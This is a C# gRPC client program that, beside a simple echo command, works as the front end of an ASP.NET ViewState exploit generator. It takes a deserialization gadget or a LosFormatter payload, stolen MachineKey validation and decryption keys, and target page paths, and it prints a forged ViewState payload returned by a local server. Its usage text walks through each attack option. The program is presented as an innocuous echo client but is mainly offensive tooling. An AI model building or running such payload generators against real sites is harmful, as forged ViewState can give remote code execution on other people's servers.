using Grpc.Net.Client;
using EchoGrpc;

using var channel = GrpcChannel.ForAddress("http://localhost:5000");

if (args.Length > 0 && args[0] == "--viewstate")
{
    await RunViewState(channel, args[1..]);
}
else if (args.Length > 0 && args[0] == "--list-gadgets")
{
    await RunListGadgets(channel);
}
else
{
    await RunEcho(channel, args);
}

static async Task RunEcho(GrpcChannel channel, string[] args)
{
    var client = new Echo.EchoClient(channel);
    var message = args.Length > 0 ? string.Join(" ", args) : "Hello, gRPC!";
    var reply = await client.SendAsync(new EchoRequest { Message = message });
    Console.WriteLine($"Server echoed: {reply.Message}");
}

static async Task RunListGadgets(GrpcChannel channel)
{
    var client = new ViewState.ViewStateClient(channel);
    var reply = await client.ListGadgetsAsync(new ListGadgetsRequest());

    if (!string.IsNullOrEmpty(reply.Error))
    {
        Console.Error.WriteLine($"Error: {reply.Error}");
        return;
    }

    Console.WriteLine($"{"Gadget",-45} {"Needs Cmd",-12} Description");
    Console.WriteLine(new string('-', 100));
    foreach (var g in reply.Gadgets)
    {
        Console.WriteLine($"{g.Name,-45} {(g.NeedsCommand ? "yes" : "no"),-12} {g.Description}");
    }
}

static async Task RunViewState(GrpcChannel channel, string[] args)
{
    var client = new ViewState.ViewStateClient(channel);

    var request = new ViewStateRequest();

    for (int i = 0; i < args.Length; i++)
    {
        switch (args[i])
        {
            case "--gadget":
                request.Gadget = args[++i];
                break;
            case "--unsigned-payload":
                request.UnsignedPayload = args[++i];
                break;
            case "--validation-key":
                request.ValidationKey = args[++i];
                break;
            case "--validation-alg":
                request.ValidationAlg = args[++i];
                break;
            case "--decryption-key":
                request.DecryptionKey = args[++i];
                break;
            case "--decryption-alg":
                request.DecryptionAlg = args[++i];
                break;
            case "--target-path":
                request.TargetPath = args[++i];
                break;
            case "--app-path":
                request.AppPath = args[++i];
                break;
            case "--viewstate-user-key":
                request.ViewstateUserKey = args[++i];
                break;
            case "--legacy":
                request.IsLegacy = true;
                break;
            case "--encrypted":
                request.IsEncrypted = true;
                break;
            case "--generator":
                request.Generator = args[++i];
                break;
            default:
                Console.Error.WriteLine($"Unknown option: {args[i]}");
                PrintViewStateUsage();
                return;
        }
    }

    if (string.IsNullOrEmpty(request.Gadget) && string.IsNullOrEmpty(request.UnsignedPayload))
    {
        Console.Error.WriteLine("Error: --gadget or --unsigned-payload is required");
        PrintViewStateUsage();
        return;
    }

    if (string.IsNullOrEmpty(request.ValidationKey))
    {
        Console.Error.WriteLine("Error: --validation-key is required");
        PrintViewStateUsage();
        return;
    }

    var reply = await client.GenerateAsync(request);

    if (!string.IsNullOrEmpty(reply.Error))
    {
        Console.Error.WriteLine($"Error: {reply.Error}");
    }
    else
    {
        Console.WriteLine(reply.Payload);
    }
}

static void PrintViewStateUsage()
{
    Console.Error.WriteLine();
    Console.Error.WriteLine("Usage: EchoClient --viewstate [options]");
    Console.Error.WriteLine("       EchoClient --list-gadgets");
    Console.Error.WriteLine();
    Console.Error.WriteLine("Required (one of):");
    Console.Error.WriteLine("  --gadget <name>               Gadget name from database (use --list-gadgets to see available)");
    Console.Error.WriteLine("  --unsigned-payload <base64>    Pre-generated LosFormatter payload");
    Console.Error.WriteLine();
    Console.Error.WriteLine("Required:");
    Console.Error.WriteLine("  --validation-key <hex>         MachineKey validation key");
    Console.Error.WriteLine();
    Console.Error.WriteLine("Optional:");
    Console.Error.WriteLine("  --validation-alg <alg>         SHA1, HMACSHA256 (default), HMACSHA384, HMACSHA512");
    Console.Error.WriteLine("  --decryption-key <hex>         MachineKey decryption key (required for modern mode)");
    Console.Error.WriteLine("  --decryption-alg <alg>         AES (default), 3DES, DES");
    Console.Error.WriteLine("  --target-path <path>           Target ASPX page path, e.g. /app/page.aspx");
    Console.Error.WriteLine("  --app-path <path>              IIS application path, e.g. /myapp/");
    Console.Error.WriteLine("  --viewstate-user-key <key>     Anti-CSRF ViewStateUserKey value");
    Console.Error.WriteLine("  --legacy                       Use .NET <= 4.0 legacy algorithm");
    Console.Error.WriteLine("  --encrypted                    Encrypt payload (legacy mode)");
    Console.Error.WriteLine("  --generator <hex>              __VIEWSTATEGENERATOR value (implies --legacy)");
}
